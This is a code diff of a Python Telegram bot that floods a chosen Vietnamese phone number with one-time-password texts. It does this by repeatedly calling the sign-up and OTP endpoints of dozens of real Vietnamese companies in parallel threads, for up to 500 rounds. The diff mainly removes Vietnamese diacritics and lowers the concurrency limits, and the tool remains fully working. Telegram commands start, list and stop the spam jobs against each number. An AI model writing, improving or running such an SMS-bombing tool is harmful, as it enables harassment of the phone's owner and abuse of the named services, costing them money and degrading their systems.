@@ -12,46 +12,36 @@ from flask import Flask
 import requests
 import re
 
-# ────────────────────────────────────────────────
-#   CẤU HÌNH
-# ────────────────────────────────────────────────
-
+# CONFIG
 TOKEN = os.environ.get('TELEGRAM_BOT_TOKEN')
 if not TOKEN or ':' not in TOKEN:
-    raise ValueError("Thiếu hoặc sai TELEGRAM_BOT_TOKEN")
+    raise ValueError("Thieu hoac sai TELEGRAM_BOT_TOKEN")
 
 bot = telebot.TeleBot(TOKEN)
 
-MAX_CONCURRENT_TARGETS   = 10000          # tối đa số điện thoại spam cùng lúc
-MAX_THREADS_PER_TARGET   = 100000         # số request song song cho 1 số
-DELAY_BETWEEN_ROUNDS_SEC = (6, 14)    # random delay giữa các vòng (giây)
+MAX_CONCURRENT_TARGETS   = 4
+MAX_THREADS_PER_TARGET   = 12
+DELAY_BETWEEN_ROUNDS_SEC = (6, 15)
 
-# Quản lý job
-active_jobs: Dict[str, dict] = {}     # phone → info job
+active_jobs = {}
 jobs_lock = threading.Lock()
 
-# ────────────────────────────────────────────────
-#   KIỂM TRA SỐ ĐIỆN THOẠI VIỆT NAM
-# ────────────────────────────────────────────────
-
+# KIEM TRA SO DIEN THOAI VN
 def is_valid_vn_phone(phone: str) -> bool:
     phone = re.sub(r'[\s\-\+]', '', phone)
     if phone.startswith('+84'):
         phone = '0' + phone[3:]
     if not phone.startswith('0'):
         return False
-    # Đầu số phổ biến 2025-2026
     return bool(re.match(r'^0(3[2-9]|5[689]|7[06-9]|8[1-689]|9[0-9])[0-9]{7}$', phone))
 
-# ────────────────────────────────────────────────
-#   CÁC HÀM GỬI OTP  (CẦN CẬP NHẬT LẠI 2025-2026)
-# ────────────────────────────────────────────────
-
+# SESSION CHUNG
 session = requests.Session()
 session.headers.update({
     'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36'
 })
 
+# CAC HAM GUI OTP (DA CHUAN HOA)
 def send_otp_via_sapo(phone: str):
     try:
         data = {'phonenumber': phone}
@@ -1062,15 +1052,7 @@ def send_otp_via_takomo(phone: str):
 ##################################################################################################################################################################################
 
 ##################################################################################################################################################################################
-
-
-import concurrent.futures  # Import module cần thiết
-import time
-
-# ... (các hàm send_otp_via_... đã được định nghĩa ở trên)
-
-def run(phone, i):
-    functions = [
+ALL_SENDERS = [
         send_otp_via_sapo, send_otp_via_viettel, send_otp_via_medicare, send_otp_via_tv360,
         send_otp_via_dienmayxanh, send_otp_via_kingfoodmart, send_otp_via_mocha, send_otp_via_fptdk,
         send_otp_via_fptmk, send_otp_via_VIEON, send_otp_via_ghn, send_otp_via_lottemart,
@@ -1089,89 +1071,72 @@ def run(phone, i):
         send_otp_via_modcha35, send_otp_via_Bibabo, send_otp_via_MOCA, send_otp_via_pantio,
         send_otp_via_Routine, send_otp_via_vayvnd, send_otp_via_tima, send_otp_via_moneygo,
         send_otp_via_takomo, send_otp_via_paynet, send_otp_via_pico, send_otp_via_PNJ, send_otp_via_TINIWORLD,
-    ] ────────────────────────────────────────────────
-#   CORE SPAM FUNCTION
-# ────────────────────────────────────────────────
+    ]
 
+# HAM CHAY SPAM MOT SO
 def spam_worker(phone: str, total_rounds: int, stop_event: threading.Event):
     for round_num in range(1, total_rounds + 1):
         if stop_event.is_set():
-            print(f"[{phone}] dừng tại vòng {round_num}")
+            print(f"[{phone}] Da dung tai vong {round_num}")
             break
 
-        print(f"[{phone}] vòng {round_num}/{total_rounds}")
+        print(f"[{phone}] Vong {round_num}/{total_rounds} bat dau")
 
         with concurrent.futures.ThreadPoolExecutor(max_workers=MAX_THREADS_PER_TARGET) as executor:
-            futures = [executor.submit(sender, phone) for sender in ALL_SENDERS]
+            futures = [executor.submit(fn, phone) for fn in ALL_SENDERS]
             for future in concurrent.futures.as_completed(futures):
                 try:
                     future.result(timeout=12)
                 except:
                     pass
 
-        # delay ngẫu nhiên
-        sec = random.uniform(*DELAY_BETWEEN_ROUNDS_SEC)
-        for _ in range(int(sec)):
+        delay = random.uniform(*DELAY_BETWEEN_ROUNDS_SEC)
+        for _ in range(int(delay)):
             if stop_event.is_set():
-                return
+                break
             time.sleep(1)
 
-    print(f"[{phone}] hoàn thành hoặc dừng")
+    print(f"[{phone}] Ket thuc - {round_num-1} vong")
     with jobs_lock:
         active_jobs.pop(phone, None)
 
-# ────────────────────────────────────────────────
-#   TELEGRAM COMMANDS
-# ────────────────────────────────────────────────
-
+# CAC LENH TELEGRAM
 @bot.message_handler(commands=['start', 'help'])
-def cmd_start_help(message: Message):
-    bot.reply_to(message,
-        "Lệnh:\n"
-        "/spam <số> <số vòng>     — bắt đầu\n"
-        "/stop                     — xem danh sách\n"
-        "/stop <số>                — dừng 1 số\n"
-        "/stopall                  — dừng hết\n"
-        "/status                   — tình trạng"
-    )
+def cmd_start(message: Message):
+    bot.reply_to(message, "Lenh:\n/spam <so> <so vong>\n/stop <so> hoac /stopall\n/status")
 
 @bot.message_handler(commands=['spam'])
 def cmd_spam(message: Message):
     parts = message.text.split()
     if len(parts) != 3:
-        bot.reply_to(message, "Dùng: /spam 0909123456 30")
+        bot.reply_to(message, "Dung: /spam 0909123456 30")
         return
 
     phone = parts[1].strip()
     try:
         count = int(parts[2])
     except:
-        bot.reply_to(message, "Số vòng phải là số nguyên.")
+        bot.reply_to(message, "So vong phai la so nguyen.")
         return
 
-    if count < 1 or count > 600:
-        bot.reply_to(message, "Số vòng hợp lệ: 1 – 600")
+    if count < 1 or count > 500:
+        bot.reply_to(message, "So vong: 1-500")
         return
 
     if not is_valid_vn_phone(phone):
-        bot.reply_to(message, "Số không hợp lệ (phải là đầu số VN 03/05/07/08/09 + 8 số)")
+        bot.reply_to(message, "So khong hop le (03/05/07/08/09 + 8 so)")
         return
 
     with jobs_lock:
         if phone in active_jobs:
-            bot.reply_to(message, f"{phone} đang chạy. Dùng /stop {phone}")
+            bot.reply_to(message, f"{phone} dang chay. Dung /stop {phone}")
             return
         if len(active_jobs) >= MAX_CONCURRENT_TARGETS:
-            bot.reply_to(message, f"Đạt giới hạn {MAX_CONCURRENT_TARGETS} job đồng thời.")
+            bot.reply_to(message, f"Dat gioi han {MAX_CONCURRENT_TARGETS} job.")
             return
 
         stop_event = threading.Event()
-
-        job_thread = threading.Thread(
-            target=spam_worker,
-            args=(phone, count, stop_event),
-            daemon=True
-        )
+        job_thread = threading.Thread(target=spam_worker, args=(phone, count, stop_event), daemon=True)
 
         active_jobs[phone] = {
             'stop_event': stop_event,
@@ -1180,10 +1145,9 @@ def cmd_spam(message: Message):
             'started': datetime.now(),
             'chat_id': message.chat.id
         }
-
         job_thread.start()
 
-    bot.reply_to(message, f"Đã bắt đầu spam → {phone} ({count} vòng)\nDùng /stop {phone} để dừng.")
+    bot.reply_to(message, f"Bat dau spam {phone} ({count} vong). Dung /stop {phone} de dung.")
 
 @bot.message_handler(commands=['stop'])
 def cmd_stop(message: Message):
@@ -1193,18 +1157,18 @@ def cmd_stop(message: Message):
     with jobs_lock:
         if target:
             if target not in active_jobs:
-                bot.reply_to(message, f"Không tìm thấy job {target}")
+                bot.reply_to(message, f"Khong tim thay {target}")
                 return
             active_jobs[target]['stop_event'].set()
-            bot.reply_to(message, f"Đã yêu cầu dừng {target}...")
+            bot.reply_to(message, f"Da yeu cau dung {target}...")
         else:
             if not active_jobs:
-                bot.reply_to(message, "Hiện không có job nào đang chạy.")
+                bot.reply_to(message, "Khong co job nao dang chay.")
                 return
-            lines = ["Job đang chạy:"]
+            lines = ["Job dang chay:"]
             for ph, info in active_jobs.items():
-                elapsed_min = (datetime.now() - info['started']).seconds // 60
-                lines.append(f"• {ph} — {info['rounds']} vòng — {elapsed_min} phút")
+                elapsed = (datetime.now() - info['started']).seconds // 60
+                lines.append(f"- {ph} ({info['rounds']} vong) - {elapsed} phut")
             bot.reply_to(message, "\n".join(lines))
 
 @bot.message_handler(commands=['stopall'])
@@ -1212,33 +1176,30 @@ def cmd_stopall(message: Message):
     with jobs_lock:
         cnt = len(active_jobs)
         if cnt == 0:
-            bot.reply_to(message, "Không có job nào.")
+            bot.reply_to(message, "Khong co job nao.")
             return
         for info in active_jobs.values():
             info['stop_event'].set()
-        bot.reply_to(message, f"Đã yêu cầu dừng tất cả ({cnt} job).")
+        bot.reply_to(message, f"Da yeu cau dung tat ca ({cnt} job).")
 
 @bot.message_handler(commands=['status'])
 def cmd_status(message: Message):
     with jobs_lock:
         if not active_jobs:
-            bot.reply_to(message, "Không có job nào đang chạy.")
+            bot.reply_to(message, "Khong co job nao.")
             return
-        lines = [f"Đang chạy {len(active_jobs)} / {MAX_CONCURRENT_TARGETS} job:"]
+        lines = [f"Dang chay {len(active_jobs)}/{MAX_CONCURRENT_TARGETS} job:"]
         for ph, info in active_jobs.items():
             start_str = info['started'].strftime("%H:%M:%S")
-            lines.append(f"• {ph} — {info['rounds']} vòng — bắt đầu {start_str}")
+            lines.append(f"- {ph} - {info['rounds']} vong - bat dau {start_str}")
         bot.reply_to(message, "\n".join(lines))
 
-# ────────────────────────────────────────────────
-#   FLASK + POLLING
-# ────────────────────────────────────────────────
-
+# FLASK + POLLING
 app = Flask(__name__)
 
 @app.route('/')
 def home():
-    return "Bot đang chạy"
+    return "Bot dang chay"
 
 def run_polling():
     while True:
